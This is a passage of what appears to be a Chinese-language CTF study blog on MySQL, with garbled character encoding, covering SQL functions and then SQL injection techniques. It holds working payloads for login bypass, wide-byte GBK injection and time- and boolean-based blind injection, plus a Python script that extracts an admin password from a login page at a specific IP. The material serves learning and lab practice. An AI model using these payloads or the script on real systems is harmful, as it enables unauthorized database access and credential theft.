|</span><br><span class="line">        #| Union    | 233         |</span><br><span class="line">        #+----------+-------------+</span><br></pre></td></tr></table></figure></li><li><p><code>ORDER BY col</code>ï¼šä»¥æŸä¸€åˆ—æ¥å‡åºæ’åˆ—ï¼Œéœ€è¦é™åºæ’åˆ—æ—¶åŠ ä¸ŠDESCå³å¯ï¼Œé€šå¸¸é€šè¿‡é™„åŠ æ­¤å‡½æ•°éªŒè¯æ•°æ®è¡¨æœ‰å¤šå°‘åˆ—ï¼Œå› ä¸ºç”¨intè¡¨ç¤ºæ ¹æ®ç¬¬å‡ ä¸ªcolumnæ’åºæ—¶ï¼Œè¶…è¿‡å®é™…å­˜åœ¨çš„åˆ—æ•°ä¼šæŠ¥é”™</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">select * from users order by 2;#æ­¤å¤„çš„2å³ä¸ºpasswdåˆ—</span><br><span class="line">        #+---------+-------------+</span><br><span class="line">        #| uname   | passwd      |</span><br><span class="line">        #+---------+-------------+</span><br><span class="line">        #| 0test   | 0test       |</span><br><span class="line">        #| 233test | 233test     |</span><br><span class="line">        #| admin   | adpasswd    |</span><br><span class="line">        #| Dr.Who  | Doctor      |</span><br><span class="line">        #| Kyriota | kyriotayyds |</span><br><span class="line">        #+---------+-------------+</span><br><span class="line">mysql&gt; select * from users order by 3;</span><br><span class="line">        #ERROR 1054 (42S22): Unknown column &#39;3&#39; in &#39;order clause&#39;</span><br></pre></td></tr></table></figure></li><li><p><code>CONCAT(col1,col2,col3...)</code>ï¼šå°†å¤šä¸ªå­—ç¬¦ä¸²è¿æ¥æˆä¸€ä¸ªå­—ç¬¦ä¸²</p></li><li><p><code>CONCAT_WS(sep_str,col1,col,col3...)</code>ï¼šå¯ä»¥æŒ‡å®šåˆ†éš”ç¬¦çš„è¿æ¥å­—ç¬¦ä¸²å‡½æ•°</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">select concat_ws(&#39;-&#39;,uname,passwd) from users;</span><br><span class="line">        #+-----------------------------+</span><br><span class="line">        #| concat_ws(&#39;-&#39;,uname,passwd) |</span><br><span class="line">        #+-----------------------------+</span><br><span class="line">        #| Kyriota-kyriotayyds         |</span><br><span class="line">        #| 0test-0test                 |</span><br><span class="line">        #| 233test-233test             |</span><br><span class="line">        #| admin-adpasswd              |</span><br><span class="line">        #| Dr.Who-Doctor               |</span><br><span class="line">        #+-----------------------------+</span><br></pre></td></tr></table></figure></li><li><p><code>GROUP_CONCAT(col SEPARATOR 'sep') FROM table GROUP BY col</code>ï¼šæŒ‡å®šåˆ†éš”ç¬¦ä¸åˆ†ç±»æ–¹å¼ï¼Œå½“ä¸å¡«å†™åˆ†ç±»æ–¹å¼åˆ™å…¨éƒ¨åˆ†ä¸ºä¸€ç±»ï¼Œè¿™å¯ä»¥æ–¹ä¾¿çˆ†è¡¨</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">select * from users;</span><br><span class="line">        #+---------+-------------+</span><br><span class="line">        #| uname   | passwd      |</span><br><span class="line">        #+---------+-------------+</span><br><span class="line">        #| Kyriota | kyriotayyds |</span><br><span class="line">        #| 0test   | 0test       |</span><br><span class="line">        #| 233test | 233test     |</span><br><span class="line">        #| admin   | adpasswd    |</span><br><span class="line">        #| Dr.Who  | Doctor      |</span><br><span class="line">        #| Dr.What | Doctor      |</span><br><span class="line">        #| Dr.How  | Doctor      |</span><br><span class="line">        #+---------+-------------+</span><br><span class="line">select group_concat(uname separator &#39; , &#39;) from users group by passwd;</span><br><span class="line">        #+-------------------------------------+</span><br><span class="line">        #| group_concat(uname separator &#39; , &#39;) |</span><br><span class="line">        #+-------------------------------------+</span><br><span class="line">        #| 0test                               |</span><br><span class="line">        #| 233test                             |</span><br><span class="line">        #| admin                               |</span><br><span class="line">        #| Dr.Who , Dr.What , Dr.How           |</span><br><span class="line">        #| Kyriota                             |</span><br><span class="line">        #+-------------------------------------+</span><br><span class="line">select group_concat(uname separator &#39;-&#39;) from users;</span><br><span class="line">        #+---------------------------------------------------+</span><br><span class="line">        #| group_concat(uname separator &#39;-&#39;)                 |</span><br><span class="line">        #+---------------------------------------------------+</span><br><span class="line">        #| Kyriota-0test-233test-admin-Dr.Who-Dr.What-Dr.How |</span><br><span class="line">        #+---------------------------------------------------+</span><br></pre></td></tr></table></figure></li><li><p><code>SELECT DISTINCT</code>ï¼šå»é™¤é‡å¤çš„æ•°æ®å†è¿”å›</p></li><li><p><code>WHERE</code>ï¼š</p><ul><li><code><></code>ï¼šä¸ç­‰äºï¼Œå¦‚ id&lt;&gt;4</li><li><code>BETWEEN ... AND ...</code>ï¼šåœ¨æŸèŒƒå›´å†…ï¼Œ å¦‚ id BETWEEN 4 AND 8</li><li><code>LIKE</code>ï¼šæ¨¡ç³ŠåŒ¹é…ï¼Œå¦‚ LIKE â€˜A%â€™ åˆ™è¡¨ç¤ºç­›é€‰å‡º Aå¼€å¤´çš„ï¼Œ%å¯ä»¥ä»£æ›¿ä¸€ä¸ªæˆ–å¤šä¸ªå­—ç¬¦</li><li><code>IN ( )</code>ï¼šåªåŒ¹é…ä¸æ‹¬å·ä¸­å¯¹åº”çš„å†…å®¹ï¼Œå¦‚ WHERE name IN (â€˜adminâ€™, â€˜guestâ€™)</li><li>NULLï¼šæ‰¾NULLæ—¶ä¸èƒ½WHERE col=NULLï¼Œåº”è¯¥æ˜¯WHERE col IS NULL</li></ul></li><li><p><code>AND / OR / NOT</code>ï¼š</p><ul><li><code>AND</code>ï¼š<code>WHERE Country='China' AND City='BeiJing'</code></li><li><code>OR</code>ï¼š<code>WHERE City='ShangHai' OR City='BeiJing'</code></li><li><code>NOT</code>ï¼š<code>WHERE NOT Country='China'</code></li></ul></li><li><p><code>CASE WHEN condition THEN statement ... END</code>ï¼šå’Œå¤§å¤šæ•°çš„caseè¯­å¥ä¸€æ ·ï¼Œä½†æ³¨æ„å®ƒç›¸å¯¹äºIF() â€» ä¸éœ€è¦é€—å·ä¸æ‹¬å· â€»</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">select *,case when mark &gt;&#x3D;90 then &#39;A&#39; when mark &gt;&#x3D;60 then &#39;B&#39; else &#39;C&#39; end as level from grades order by mark desc;</span><br><span class="line">        #+------+------+-------+</span><br><span class="line">        #| Name | mark | level |</span><br><span class="line">        #+------+------+-------+</span><br><span class="line">        #| Tom  |   95 | A     |</span><br><span class="line">        #| Jill |   92 | A     |</span><br><span class="line">        #| Alan |   76 | B     |</span><br><span class="line">        #| Neo  |   59 | C     |</span><br><span class="line">        #+------+------+-------+</span><br></pre></td></tr></table></figure></li><li><p><code>IF(exp1,exp2,exp3)</code>ï¼šè‹¥exp1ï¼Œåˆ™exp2ï¼Œå¦åˆ™exp3</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">select *,if(mark&gt;&#x3D;60, &#39;PASS&#39;, &#39;NOPE&#39;) from grades;</span><br><span class="line">        #+------+------+------------------------------+</span><br><span class="line">        #| Name | mark | if(mark&gt;&#x3D;60, &#39;PASS&#39;, &#39;NOPE&#39;) |</span><br><span class="line">        #+------+------+------------------------------+</span><br><span class="line">        #| Tom  |   95 | PASS                         |</span><br><span class="line">        #| Jill |   92 | PASS                         |</span><br><span class="line">        #| Neo  |   59 | NOPE                         |</span><br><span class="line">        #| Alan |   76 | PASS                         |</span><br><span class="line">        #+------+------+------------------------------+</span><br></pre></td></tr></table></figure></li><li><p><code>SUBSTR / MID(str,start,length)</code>ï¼šstartä¸ºèµ·ç‚¹ï¼›lengthä¸ºæˆªå–é•¿åº¦ï¼Œlengthå¯é€‰æ‹©ä¸å¡«</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">select substr(passwd,1,3) from users;</span><br><span class="line">        #+--------------------+</span><br><span class="line">        #| substr(passwd,1,3) |</span><br><span class="line">        #+--------------------+</span><br><span class="line">        #| kyr                |</span><br><span class="line">        #| 0te                |</span><br><span class="line">        #| 233                |</span><br><span class="line">        #| adp                |</span><br><span class="line">        #| Doc                |</span><br><span class="line">        #| Doc                |</span><br><span class="line">        #| Doc                |</span><br><span class="line">        #+--------------------+</span><br></pre></td></tr></table></figure></li><li><p><code>SUBSTR / MID((col)from(start))</code>ï¼šè¿™ç§è¡¨è¾¾å¾ˆå…³é”®çš„ä¸€ç‚¹åœ¨äº â€» ä¸éœ€è¦é€—å· â€»</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">select mid((passwd)from(3)) from users;</span><br><span class="line">#+----------------------+</span><br><span class="line">#| mid((passwd)from(3)) |</span><br><span class="line">#+----------------------+</span><br><span class="line">#| riotayyds            |</span><br><span class="line">#| est                  |</span><br><span class="line">#| 3test                |</span><br><span class="line">#| passwd               |</span><br><span class="line">#| ctor                 |</span><br><span class="line">#| ctor                 |</span><br><span class="line">#| ctor                 |</span><br><span class="line">#+----------------------+</span><br></pre></td></tr></table></figure></li><li><p><code>MD5()</code>ï¼šSQLä¹Ÿå†…ç½®äº† md5åŠ å¯†å‡½æ•°</p></li><li><p><code>SLEEP()</code>ï¼šå»¶è¿Ÿå‡½æ•°ï¼Œå•ä½ä¸ºç§’</p></li></ul><h2 id="information-schema"><a href="#information-schema" class="headerlink" title="information_schema"></a><big>information_schema</big></h2><p>ä¿¡æ¯æ•°æ®åº“ï¼Œä¿å­˜ç€å…³äºmysqlæœåŠ¡å™¨æ‰€ç»´æŠ¤çš„æ‰€æœ‰å…¶ä»–æ•°æ®åº“çš„ä¿¡æ¯ï¼Œè¯¥æ•°æ®åº“ä¸­åˆæœ‰å‡ ä¸ªé‡è¦çš„æ•°æ®è¡¨ï¼Œè€Œå½“éœ€è¦è·¨æ•°æ®åº“è®¿é—®æ—¶ï¼Œåˆ™ä¸ç±»æˆå‘˜çš„è®¿é—®ç›¸ä¼¼ï¼Œå¦‚å¯¹äºCOLUMNSï¼šinformation_schema.COLUMNS</p><ul><li><p>SCHEMATAï¼šæä¾›äº†å½“å‰mysqlå®ä¾‹ä¸­æ‰€æœ‰æ•°æ®åº“çš„ä¿¡æ¯</p><ul><li>SCHEMA_NAMEè¿™ä¸€åˆ—è®°å½•ç€æ‰€æœ‰æ•°æ®åº“å</li></ul></li><li><p>TABLESï¼šæä¾›äº†å½“å‰æ•°æ®åº“ä¸­çš„è¡¨çš„ä¿¡æ¯ï¼Œè¡¨ç±»å‹ï¼Œè¡¨å¼•æ“ï¼Œæ‰€å±çš„æ•°æ®åº“ï¼Œåˆ›å»ºæ—¶é—´ç­‰ä¿¡æ¯</p><ul><li>TABLE_NAMEï¼šæ•°æ®è¡¨å</li><li>TABLE_SCHEMAï¼šè¡¨å¯¹åº”çš„æ•°æ®åº“å</li></ul></li><li><p>COLUMNSï¼šæä¾›äº†è¡¨ä¸­åˆ—çš„ä¿¡æ¯ï¼Œè¯¦ç»†è¡¨è¿°æ‰€æœ‰åˆ—çš„ä¿¡æ¯</p><ul><li><p>TABLE_SCHEMAï¼šæ•°æ®åº“å</p></li><li><p>TABLE_NAMEï¼šè¡¨å</p></li><li><p>COLUMN_NAMEï¼šåˆ—å</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">select * from columns where table_name&#x3D;&#39;users&#39;;</span><br><span class="line">        #+---------------+--------------------+------------+---------------------+------------------+----------------+-------------+-----------+--------------------------+------------------------+-------------------+---------------+--------------------+--------------------+--------------------+-------------+------------+-------+---------------------------------+----------------+-----------------------+--------+</span><br><span class="line">        #| TABLE_CATALOG | TABLE_SCHEMA       | TABLE_NAME | COLUMN_NAME         | ORDINAL_POSITION | COLUMN_DEFAULT | IS_NULLABLE | DATA_TYPE | CHARACTER_MAXIMUM_LENGTH | CHARACTER_OCTET_LENGTH | NUMERIC_PRECISION | NUMERIC_SCALE | DATETIME_PRECISION | CHARACTER_SET_NAME | COLLATION_NAME     | COLUMN_TYPE | COLUMN_KEY | EXTRA | PRIVILEGES                      | COLUMN_COMMENT | GENERATION_EXPRESSION | SRS_ID |</span><br><span class="line">        #+---------------+--------------------+------------+---------------------+------------------+----------------+-------------+-----------+--------------------------+------------------------+-------------------+---------------+--------------------+--------------------+--------------------+-------------+------------+-------+---------------------------------+----------------+-----------------------+--------+</span><br><span class="line">        #| def           | performance_schema | users      | CURRENT_CONNECTIONS |                2 | NULL           | NO          | bigint    |                     NULL |                   NULL |                19 |             0 |               NULL | NULL               | NULL               | bigint      |            |       | select,insert,update,references |                |                       |   NULL |</span><br><span class="line">        #| def           | performance_schema | users      | TOTAL_CONNECTIONS   |                3 | NULL           | NO          | bigint    |                     NULL |                   NULL |                19 |             0 |               NULL | NULL               | NULL               | bigint      |            |       | select,insert,update,references |                |                       |   NULL |</span><br><span class="line">        #| def           | performance_schema | users      | USER                |                1 | NULL           | YES         | char      |                       32 |                    128 |              NULL |          NULL |               NULL | utf8mb4            | utf8mb4_bin        | char(32)    | UNI        |       | select,insert,update,references |                |                       |   NULL |</span><br><span class="line">        #| def           | test               | users      | passwd              |                2 | NULL           | YES         | varchar   |                       12 |                     48 |              NULL |          NULL |               NULL | utf8mb4            | utf8mb4_0900_ai_ci | varchar(12) |            |       | select,insert,update,references |                |                       |   NULL |</span><br><span class="line">        #| def           | test               | users      | uname               |                1 | NULL           | YES         | varchar   |                       10 |                     40 |              NULL |          NULL |               NULL | utf8mb4            | utf8mb4_0900_ai_ci | varchar(10) |            |       | select,insert,update,references |                |                       |   NULL |</span><br><span class="line">        #+---------------+--------------------+------------+---------------------+------------------+----------------+-------------+-----------+--------------------------+------------------------+-------------------+---------------+--------------------+--------------------+--------------------+-------------+------------+-------+---------------------------------+----------------+-----------------------+--------+</span><br></pre></td></tr></table></figure></li></ul></li></ul><h2 id="åŸºäºçº¦æŸçš„æ”»å‡»"><a href="#åŸºäºçº¦æŸçš„æ”»å‡»" class="headerlink" title="åŸºäºçº¦æŸçš„æ”»å‡»"></a><big>åŸºäºçº¦æŸçš„æ”»å‡»</big></h2><blockquote>åœ¨MySQLçš„é…ç½®é€‰é¡¹ä¸­ï¼Œæœ‰ä¸€ä¸ªsql_modeé€‰é¡¹ã€‚å½“MySQLçš„sql_modeè®¾ç½®ä¸ºdefaultæ—¶ï¼Œå³æ²¡æœ‰å¼€å¯STRICT_ALL_TABLESé€‰é¡¹æ—¶ï¼ŒMySQLå¯¹äºç”¨æˆ·æ’å…¥çš„è¶…é•¿å€¼åªä¼šæç¤ºwarningï¼Œè€Œä¸æ˜¯errorï¼ˆå¦‚æœæ˜¯erroråˆ™æ’å…¥ä¸æˆåŠŸï¼‰ï¼Œè¿™å¯èƒ½ä¼šå¯¼è‡´å‘ç”Ÿä¸€äº›â€œæˆªæ–­â€é—®é¢˜ â€”â€”â€”â€” é“å“¥</blockquote><p>å› ä¸ºåœ¨sqlæ‰§è¡Œå­—ç¬¦ä¸²å¤„ç†æ—¶ï¼Œå­—ç¬¦ä¸²æœ«å°¾çš„ç©ºæ ¼ç¬¦å°†ä¼šè¢«åˆ é™¤ï¼Œå¯¼è‡´ â€œadminâ€ä¸ â€œadmin     â€æ˜¯ç­‰æ•ˆçš„ã€‚å½“ä½¿ç”¨å¦‚ â€œadmin                       xâ€è¿™æ ·çš„è¶…é•¿å­—ç¬¦ä¸²ï¼Œæˆ–æœ«å°¾ç›´æ¥æ˜¯ç©ºæ ¼çš„â€œadmin   â€æ³¨å†ŒæˆåŠŸï¼Œå‰è€…ä¼šå› ä¸ºæˆªæ–­ï¼Œå’Œåè€…ä¸€æ ·å¯ä»¥è¾¾åˆ°è¶Šæƒè·å–æƒé™</p><h2 id="SQLæŸ¥è¯¢ä¸æ¯”è¾ƒ"><a href="#SQLæŸ¥è¯¢ä¸æ¯”è¾ƒ" class="headerlink" title="SQLæŸ¥è¯¢ä¸æ¯”è¾ƒ"></a><big>SQLæŸ¥è¯¢ä¸æ¯”è¾ƒ</big></h2><p>strä¸intçš„æ¯”è¾ƒï¼šä¸PHPä¸€æ ·ï¼Œéæ•°å­—å¼€å¤´çš„strè¢«å½“æˆ 0ï¼Œæ•°å­—å¼€å¤´çš„ä¼šè¢«å½“æˆé‚£ä¸ªå¼€å¤´çš„æ•°å­—ï¼Œè¿™ä½¿å¾—åœ¨è¾“å…¥ user=0æˆ– user=â€™â€™æ—¶è¿”å›æ‰€æœ‰é 0å¼€å¤´çš„ user</p><p>SQLè¿ç­‰ï¼šé˜´é—´è¯­æ³•ï¼Œå¦‚ where user=â€™adminâ€™=â€™adminâ€™=1ï¼Œå¯ç†è§£ä¸ºåšå¼‚æˆ–å–å (åŒæˆ–)è¿ç®—</p><blockquote>æŸ¥ç¬¬ä¸€ä¸ªadminï¼ŒæŸ¥è¯¢å¯¹è±¡æ˜¯åŸæœ¬çš„æ•°æ®è¡¨ï¼Œç»“æœä¸º{adminï¼š1ï¼Œå…¶ä»–ï¼š0}    æ­¤æ—¶è¿˜æ²¡æœ‰åˆ°è¿”å›adminå¹¶æ‰“å°å‡ºæ¥çš„æ—¶å€™ï¼Œå› ä¸ºåé¢çš„è¿ç­‰è¿˜æ²¡æœ‰æ¯”è¾ƒå®Œ</blockquote><blockquote>æŸ¥ç¬¬äºŒä¸ªadminï¼ŒæŸ¥è¯¢å¯¹è±¡æ˜¯1å’Œ0ï¼Œå› ä¸ºadminéæ•°å­—å¼€å¤´ï¼Œæ­¤æ—¶å’Œintæ¯”è¾ƒï¼Œè½¬æ¢æˆ0ï¼Œå’Œä¸Šæ¬¡éadminçš„å­—æ®µçš„æŸ¥è¯¢ç»“æœåŒ¹é…ï¼Œæ‰€ä»¥è¿™æ¬¡æ¯”è¾ƒç»“æœä¸º{adminï¼š0ï¼Œå…¶ä»–ï¼š1}</blockquote><blockquote>ç¬¬ä¸‰æ¬¡æŸ¥1ï¼Œæ˜¾ç„¶åŒ¹é…åˆ°å…¶ä»–ï¼Œæ•…æœ€ç»ˆè¿”å›ä¸ºå¤„adminå¤–çš„æ‰€æœ‰æˆå‘˜</blockquote><h2 id="ä¸‡-èƒ½-é’¥-åŒ™"><a href="#ä¸‡-èƒ½-é’¥-åŒ™" class="headerlink" title="ä¸‡ èƒ½ é’¥ åŒ™"></a><big>ä¸‡ èƒ½ é’¥ åŒ™</big></h2><p>æœ€åŸºç¡€çš„SQLæ³¨å…¥ï¼šadminâ€™ or â€˜1â€™=â€™1</p><h2 id="å®½å­—èŠ‚æ³¨å…¥"><a href="#å®½å­—èŠ‚æ³¨å…¥" class="headerlink" title="å®½å­—èŠ‚æ³¨å…¥"></a><big>å®½å­—èŠ‚æ³¨å…¥</big></h2><p align='right'><small>ç‰¹å¾ï¼šgbkç­‰å®½å­—èŠ‚ç¼–ç </small></p><p>é€šå¸¸çš„åœ¨sqlè¯­å¥å‰é¢ä½¿ç”¨äº†ä¸€ä¸ªaddslashes()ï¼Œå°†$idçš„å€¼è½¬ä¹‰ã€‚è¿™æ˜¯é€šå¸¸å¯¹sqlæ³¨å…¥è¿›è¡Œçš„æ“ä½œï¼Œåªè¦æˆ‘ä»¬çš„è¾“å…¥å‚æ•°åœ¨å•å¼•å·ä¸­ï¼Œå°±é€ƒé€¸ä¸å‡ºå•å¼•å·çš„é™åˆ¶ï¼Œæ— æ³•æ³¨å…¥</p><p>å®½å­—èŠ‚æ³¨å…¥æ˜¯åˆ©ç”¨mysqlçš„ä¸€ä¸ªç‰¹æ€§ï¼Œmysqlåœ¨ä½¿ç”¨GBKç¼–ç çš„æ—¶å€™ï¼Œä¼šè®¤ä¸ºä¸¤ä¸ªå­—ç¬¦æ˜¯ä¸€ä¸ªæ±‰å­—ï¼ˆå‰ææ˜¯å‰ä¸€ä¸ªASCIIç å¤§äº128ï¼Œè¿™æ ·æ‰èƒ½è¾¾åˆ°æ±‰å­—çš„èŒƒå›´ï¼Œå¦‚%dfä¹‹ç±»çš„ï¼‰</p><p>ç¤ºä¾‹payloadï¼š<code>/?id=hello%df' union select 'admin','pass'#</code></p><h2 id="ç›²æ³¨"><a href="#ç›²æ³¨" class="headerlink" title="ç›²æ³¨"></a><big>ç›²æ³¨</big></h2><p align='right'><small>SQLI-LAB</small></p><p>å¯¹æ— å›æ˜¾é¡µé¢çš„æ³¨å…¥å«åšç›²æ³¨ï¼Œå¤§å¤šæ•°æ—¶å€™éƒ½æ˜¯é‡è§çš„è¿™æ ·çš„é¡µé¢ï¼Œåˆ†ä¸ºå¸ƒå°”ç›²æ³¨å’Œæ—¶é—´ç›²æ³¨ï¼Œä½†æœ¬è´¨ä¸Šå·®åˆ«ä¸å¤§ã€‚åŸç†å¤§è‡´å¯ç†è§£ä¸ºä¸æ–­çŒœæµ‹å­—ç¬¦çš„è¿‡ç¨‹ï¼Œé€šè¿‡æ³¨å…¥åè¿”å›çš„ä¿¡æ¯åˆ¤æ–­çŒœå¯¹ä¸å¦ï¼Œæœ‰ç‚¹æš´åŠ›ç ´è§£çš„æ„æ€ã€‚ç”±äºç›²æ³¨çš„é‡å¤æ€§ï¼Œæ‰‹æ³¨åœ¨ç›²æ³¨ä¸­æœ€å¤šç”¨äºç›²æ³¨ç±»å‹çš„åˆ¤æ–­ï¼ŒçŒœæµ‹è¿‡ç¨‹åˆ™äº¤ç»™è„šæœ¬ï¼Œburpï¼Œsqlmapç­‰å®Œæˆ</p><p>é€šå¸¸ç›²æ³¨æ—¶å…ˆè·‘æ•°æ®åº“åçš„é•¿åº¦ï¼Œå†è·‘æ•°æ®åº“åï¼Œç„¶ååˆè·‘è¡¨åçš„é•¿åº¦â€¦å¦‚æœæœ‰éœ€è¦ç”šè‡³å¯çˆ†æ•´ä¸ªæ•°æ®åº“ï¼Œä¹Ÿå¯ä»¥ä¸è·‘é•¿åº¦è€Œç›´æ¥å¼€å§‹è·‘å†…å®¹ï¼Œå› ä¸ºçŸ¥é“é•¿åº¦çš„ä½œç”¨åªæ˜¯å¿ƒé‡Œæœ‰ä¸ªåº•ã€‚å¸ƒå°”ç›²æ³¨å’Œæ—¶é—´ç›²æ³¨çš„åŒºåˆ«å°±åªæ˜¯åœ¨äºè¿”å›ä¿¡æ¯ä¸åŒï¼Œå¸ƒå°”ç›²æ³¨é€šè¿‡è¿”å›ä¸¤ç§çŠ¶æ€ä¿¡æ¯åˆ¤æ–­ï¼Œæ—¶é—´ç›²æ³¨åˆ™æ ¹æ®å“åº”æ—¶é—´åˆ¤æ–­</p><ul><li><p>payloadæ„é€ ä¸ç¤ºä¾‹</p><p>æ„é€ payloadæ—¶ï¼Œåº”æ ¹æ®ç½‘é¡µå®ç°çš„åŠŸèƒ½è€ƒè™‘ä½¿ç”¨äº†ä»€ä¹ˆSQLæŸ¥è¯¢è¯­å¥ï¼Œè¿™æ ·æ‰èƒ½å‡†ç¡®çŸ¥é“éœ€è¦å¤šå°‘æ‹¬å·æˆ–å¼•å·æ¥é—­åˆè¯­å¥</p><ul><li><p>è¡¨é•¿ï¼ˆåŒ…å«åœ¨INSERT INTO â€¦ VALUE(input)ä¸­ï¼‰ï¼š<code>'and (case when (length((select group_concat(table_name separator '-') from information_schema.tables where table_schema=database()))=10) then sleep(5) else 1 end)) #</code></p><p>  å¯ä»¥å‘ç°ç»“å°¾å› ä¸ºè¦æ³¨é‡Šæ‰å¤šä½™çš„ <code>')</code> è€Œè¡¥äº†ä¸€ä¸ªåæ‹¬å·</p></li><li><p>è¡¨åï¼š<code>if(substr((select group_concat(table_name separator ',') from information_schema.tables where table_schema=database())Â  from %s for 1)='%s',sleep(5),1)</code></p></li><li><p>å­—æ®µåï¼š<code>ascii(mid((select group_concat(column_name separator '-') from information_schema.columns where table_name='è¡¨å') from(%i)))=%i</code></p></li></ul></li><li><p>e.g.å¸ƒå°”ç›²æ³¨çŒœadminå¯†ç </p><ul><li><p>å¦‚è¿”å›â€œç”¨æˆ·åä¸å­˜åœ¨â€ä¸â€œå¯†ç é”™è¯¯â€ä¸¤ç§ä¿¡æ¯çš„é¡µé¢ï¼Œå°±å¯ä»¥å°è¯•å¸ƒå°”ç›²æ³¨</p>  <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">result=<span class="string">&#x27;&#x27;</span></span><br><span class="line">url=<span class="string">&#x27;http://114.67.246.176:13058/login.php&#x27;</span><span class="comment">#æ³¨æ„æ˜¯ç™»å½•é¡µè€Œéindex</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>):<span class="comment">#çŒœæµ‹æ˜¯MD5åŠ å¯†ï¼Œä¸º32ä½ï¼Œå…ˆè·‘33ä½è¯•è¯•</span></span><br><span class="line">    <span class="keyword">for</span> tar <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">128</span>):<span class="comment">#32~128ä¸ºå¸¸ç”¨çš„96ä¸ªASCIIå­—ç¬¦</span></span><br><span class="line">        uname=<span class="string">&quot;admin&#x27;=&#x27;admin&#x27;=ascii(mid((passwd)from(%s)))-%s-&#x27;&quot;</span>%(i,tar)</span><br><span class="line">        data=&#123;<span class="string">&#x27;uname&#x27;</span>:uname,<span class="string">&#x27;passwd&#x27;</span>:<span class="string">&#x27;anything&#x27;</span>&#125;</span><br><span class="line">        response=requests.post(url=url,data=data).text</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;password&#x27;</span> <span class="keyword">in</span> response:<span class="comment">#æŠ¥å¯†ç é”™è¯¯æ—¶è¯´æ˜tarçš„å€¼ä¸å¯†ç ç¬¬iä½å­—ç¬¦çš„ASCIIç›¸åŒ</span></span><br><span class="line">            result+=<span class="built_in">chr</span>(tar)</span><br><span class="line">            print(<span class="string">&quot;\r%s&quot;</span>%result,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure></li><li><p>ä¸Šè¿°è„šæœ¬ä¸æ˜¯ç»å¯¹çš„ï¼Œæœ‰çš„ç™»å½•é¡µå¯èƒ½å¯¹æŸäº›æ³¨å…¥æ–¹å¼è®¾ç½®äº†é’ˆå¯¹æ€§è¿‡æ»¤ï¼Œå…·ä½“çš„payloadæ„é€ è¿˜éœ€è¦å¯¹åº”å…·ä½“æƒ…å†µï¼Œæ­¤å¤„å†ä¸¾ä¸€ä¸ªâ€œ=â€è¢«è¿‡æ»¤çš„ä¾‹å­</p>  <center><code>"admin'^((ascii(mid((select(password)from(admin))from(%s))))<>%s)^1#"</code></center></li></ul></li></ul><h2 id="é¢„å¤„ç†è¯­å¥"><a href="#é¢„å¤„ç†è¯­å¥" class="headerlink" title="é¢„å¤„ç†è¯­å¥"></a><big>é¢„å¤„ç†è¯­å¥</big></h2><p>æ‰€è°“é¢„å¤„ç†æŒ‡çš„å°±æ˜¯å°†SQLè¯­å¥ä¸­çš„å…³é”®å­—(å¦‚ 